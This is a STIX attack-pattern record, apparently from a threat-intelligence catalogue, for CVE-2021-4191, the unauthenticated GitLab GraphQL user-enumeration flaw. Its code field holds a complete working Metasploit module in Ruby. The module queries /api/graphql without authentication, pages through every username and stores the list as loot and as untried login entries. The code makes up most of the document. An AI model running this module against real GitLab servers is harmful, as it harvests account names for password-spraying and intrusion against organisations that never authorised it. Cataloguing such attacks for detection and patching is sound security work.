{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9766e6b5-8f38-4c04-abe2-3a3950341402",
    "created": "2024-08-14T16:30:15.620122Z",
    "modified": "2024-08-14T16:30:15.620125Z",
    "name": "GitLab GraphQL API User Enumeration",
    "description": " This module queries the GitLab GraphQL API without authentication",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/gitlab_graphql_user_enum.rb",
            "external_id": "gitlab_graphql_user_enum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-4191"
        },
        {
            "source_name": "reference",
            "url": "https://about.gitlab.com/releases/2022/02/25/critical-security-release-gitlab-14-8-2-released/#unauthenticated-user-enumeration-on-graphql-api"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GitLab GraphQL API User Enumeration',\n        'Description' => %q{\n          This module queries the GitLab GraphQL API without authentication\n          to acquire the list of GitLab users (CVE-2021-4191). The module works\n          on all GitLab versions from 13.0 up to 14.8.2, 14.7.4, and 14.6.5.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'jbaines-r7', # Independent discovery and Metasploit module\n          'mungsul' # Independent discovery\n        ],\n        'References' => [\n          [ 'CVE', '2021-4191' ],\n          [ 'URL', 'https://about.gitlab.com/releases/2022/02/25/critical-security-release-gitlab-14-8-2-released/#unauthenticated-user-enumeration-on-graphql-api'],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/']\n        ],\n        'DisclosureDate' => '2022-02-25',\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  ##\n  # Send the GraphQL query to the /api/graphql endpoint. Despite being able to\n  # extract significantly more information, this request will only request\n  # usernames. The function will do some verification to ensure the received\n  # payload is the expected JSON.\n  #\n  # @param after [String] The parameter is used for paging because GitLab will only\n  #   return 100 results at a time. If no paging is needed this should be empty.\n  # @return [Hash] A Ruby Hash representation of the returned JSON data.\n  ##\n  def do_request(after)\n    graphql_query = '{\"query\": \"query { users'\n    unless after.empty?\n      graphql_query += \"(after:\\\\\\\"#{after}\\\\\\\")\"\n    end\n    graphql_query.concat(' { pageInfo { hasNextPage, hasPreviousPage, endCursor, startCursor }, nodes { username } } }\" }')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/api/graphql'),\n      'ctype' => 'application/json',\n      'data' => graphql_query\n    })\n\n    fail_with(Failure::UnexpectedReply, \"The target didn't respond with 200 OK\") unless res&.code == 200\n    fail_with(Failure::UnexpectedReply, \"The target didn't respond with an HTTP body\") unless res.body\n\n    user_json = res.get_json_document\n    fail_with(Failure::UnexpectedReply, \"The target didn't return a JSON body\") if user_json.nil?\n\n    nodes = user_json.dig('data', 'users', 'nodes')\n    fail_with(Failure::UnexpectedReply, 'Could not find nodes in the JSON body') if nodes.nil?\n\n    user_json\n  end\n\n  ##\n  # Parses the JSON data returned by the server. Adds the usernames to\n  # the users array and adds them, indirectly, to create_credential_login.\n  # This function also determines if we need to request more data from\n  # the server.\n  #\n  # @param user_json [Hash] The JSON data provided by the server\n  # @param users [Array] An array to store new usernames in\n  # @return [String] An empty string or the \"endCursor\" to use with do_request\n  ##\n  def parse_json(user_json, users)\n    nodes = user_json.dig('data', 'users', 'nodes')\n    return '' if nodes.nil?\n\n    nodes.each do |node|\n      username = node['username']\n      store_username(username, node)\n      users.push(username)\n    end\n\n    query_paging_info = ''\n    more_data = user_json.dig('data', 'users', 'pageInfo', 'hasNextPage')\n    if !more_data.nil? && more_data == true\n      query_paging_info = user_json['data']['users']['pageInfo']['endCursor']\n    end\n\n    query_paging_info\n  end\n\n  def store_userlist(users, service)\n    loot = store_loot('gitlab.users', 'text/plain', rhost, users, nil, 'GitLab Users', service)\n    print_good(\"Userlist stored at #{loot}\")\n  end\n\n  def store_username(username, json)\n    connection_details = {\n      module_fullname: fullname,\n      workspace_id: myworkspace_id,\n      username: username,\n      proof: json,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_details)\n    create_credential_and_login(connection_details)\n  end\n\n  ##\n  # Send an initial GraphQL request to the server and keep sending\n  # requests until the server has no more data to give us.\n  ##\n  def run_host(_ip)\n    user_json = do_request('')\n\n    service = report_service(\n      host: rhost,\n      port: rport,\n      name: (ssl ? 'https' : 'http'),\n      proto: 'tcp'\n    )\n\n    # parse the initial page\n    users = []\n    query_paging_info = parse_json(user_json, users)\n\n    # handle any follow on pages\n    request_count = 0\n    until query_paging_info.empty?\n      # periodically tell the user that we are still working. Start at 1 since one request already happened\n      request_count += 1\n      print_status(\"GraphQL API pagination request: #{request_count}\") if request_count % 5 == 0\n      user_json = do_request(query_paging_info)\n      query_paging_info = parse_json(user_json, users)\n    end\n\n    if users.empty?\n      print_error('No GitLab users were enumerated.')\n    else\n      print_good(\"Enumerated #{users.length} GitLab users\")\n      users_string = users.join(\"\\n\") + \"\\n\"\n      store_userlist(users_string, service)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-02-25"
}